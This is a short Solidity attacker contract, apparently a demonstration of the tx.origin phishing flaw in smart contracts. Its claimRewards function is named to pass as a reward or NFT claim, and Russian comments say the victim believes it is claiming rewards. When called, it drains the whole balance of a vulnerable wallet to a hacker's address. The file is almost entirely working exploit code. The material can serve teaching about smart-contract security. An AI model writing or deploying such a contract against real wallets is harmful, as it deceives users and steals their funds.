// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableWallet.sol";

contract AttackerContract {
    VulnerableWallet public wallet;
    address public hacker;

    constructor(address _wallet, address _hacker) {
        wallet = VulnerableWallet(payable(_wallet));
        hacker = _hacker;
    }

    // Жертва думает, что вызывает функцию клейма NFT или дивидендов
    function claimRewards() external {
        // Но на самом деле мы используем tx.origin жертвы, чтобы украсть её эфир!
        uint256 stolenAmount = address(wallet).balance;
        wallet.transfer(hacker, stolenAmount);
    }
}
